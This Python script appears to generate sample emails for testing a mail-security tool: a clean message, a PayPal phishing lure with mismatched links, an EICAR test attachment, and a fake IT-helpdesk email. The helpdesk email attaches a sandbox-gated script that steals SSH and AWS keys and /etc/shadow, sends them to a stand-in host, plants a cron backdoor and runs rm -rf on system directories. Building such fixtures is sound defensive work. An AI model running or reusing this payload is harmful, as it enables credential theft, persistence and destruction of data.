"""Generates the four demo emails in samples/. All are harmless:
- clean.eml           a normal internal email
- phishing.eml        fake PayPal, failed SPF/DMARC, mismatched links
- eicar.eml           carries the EICAR antivirus *test* file (not malware)
- hostile_script.eml  a script that tries to steal keys, phone home, wipe the
                      disk and hang. It refuses to do anything unless it sees
                      MAILGUARD_SANDBOX=1, so it is safe even if run by mistake.
eicar.eml is generated, not committed, so antivirus on clones stays quiet.
"""
from email.message import EmailMessage
from pathlib import Path

OUT = Path(__file__).resolve().parent / "samples"

HOSTILE = r'''# "Invoice viewer" -- MailGuard demo payload. Safe outside the sandbox.
import os, socket, subprocess, base64
if os.environ.get("MAILGUARD_SANDBOX") != "1":
    raise SystemExit("demo payload: refusing to run outside the MailGuard sandbox")

loot = {}
for path in ("~/.ssh/id_rsa", "~/.aws/credentials", "/etc/shadow"):
    try:
        loot[path] = open(os.path.expanduser(path)).read()
    except OSError as e:
        print("steal", path, "->", e)
loot["env"] = {k: os.environ[k] for k in os.environ if "KEY" in k or "SECRET" in k}

try:  # exfiltrate
    s = socket.create_connection(("exfil.evil-c2.xyz", 443), timeout=3)
    s.sendall(base64.b64encode(repr(loot).encode()))
except OSError as e:
    print("exfil ->", e)

try:  # persistence
    open("/etc/cron.d/backdoor", "w").write("* * * * * root sh /tmp/x")
except OSError as e:
    print("persist ->", e)

r = subprocess.run("rm -rf /usr /etc /home 2>&1 | head -3", shell=True, capture_output=True, text=True)
print("wipe ->", r.stdout.strip() or r.returncode)

exec(base64.b64decode("cHJpbnQoJ3N0YWdlIDIgbG9hZGVkJyk=").decode())
while True:  # burn CPU forever
    pass
'''


def write(name, msg):
    OUT.mkdir(exist_ok=True)
    (OUT / name).write_bytes(bytes(msg))
    print("wrote", OUT / name)


def base(frm, to, subject, auth):
    m = EmailMessage()
    m["From"], m["To"], m["Subject"] = frm, to, subject
    m["Date"] = "Fri, 27 Nov 2026 09:14:00 +0000"
    m["Message-ID"] = f"<{abs(hash(subject))}@mailguard.demo>"
    m["Authentication-Results"] = auth
    return m


def main():
    m = base("Anna Berg <anna@acme-startup.com>", "team@acme-startup.com", "Notes from Thursday's planning",
             "mx.acme-startup.com; spf=pass smtp.mailfrom=acme-startup.com; dkim=pass; dmarc=pass")
    m.set_content("Hi all,\n\nNotes from Thursday are in the shared drive: https://docs.acme-startup.com/planning\n\n"
                  "Next sync is Monday at 10.\n\nAnna")
    write("clean.eml", m)

    m = base('"PayPal Security" <service@paypa1-support.xyz>', "felix@acme-startup.com",
             "Your account has been limited - action required",
             "mx.acme-startup.com; spf=fail smtp.mailfrom=paypa1-support.xyz; dkim=none; dmarc=fail")
    m["Reply-To"] = "help@secure-mailbox.ru"
    m.set_content("We noticed unusual activity. Verify your account within 24 hours or your account will be suspended.")
    m.add_alternative("""<p>Dear customer,</p><p>We noticed <b>unusual activity</b> on your account.
Please <b>verify your account within 24 hours</b> or your account will be suspended.</p>
<p><a href="http://paypa1-login.xyz/verify?id=88213">https://www.paypal.com/signin</a></p>
<p>Enter your password and card number to confirm your identity.</p>""", subtype="html")
    write("phishing.eml", m)

    m = base("Accounts <billing@quick-invoices.top>", "felix@acme-startup.com", "Invoice #44120 overdue",
             "mx.acme-startup.com; spf=softfail smtp.mailfrom=quick-invoices.top; dmarc=none")
    m.set_content("Please see the attached invoice and pay immediately.")
    eicar = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*").encode()
    m.add_attachment(eicar, maintype="application", subtype="octet-stream", filename="invoice.pdf.exe")
    write("eicar.eml", m)

    m = base("IT Helpdesk <it-support@acme-startup.co>", "felix@acme-startup.com", "Required: install the new invoice viewer",
             "mx.acme-startup.com; spf=pass smtp.mailfrom=acme-startup.co; dkim=pass; dmarc=pass")
    m["Reply-To"] = "helpdesk@evil-c2.xyz"
    m.set_content("Hi,\n\nFinance needs everyone on the new invoice viewer by Monday. Run the attached script "
                  "immediately so your access is not locked.\n\nIT")
    m.add_attachment(HOSTILE.encode(), maintype="text", subtype="x-python", filename="invoice_viewer.py")
    write("hostile_script.eml", m)


if __name__ == "__main__":
    main()
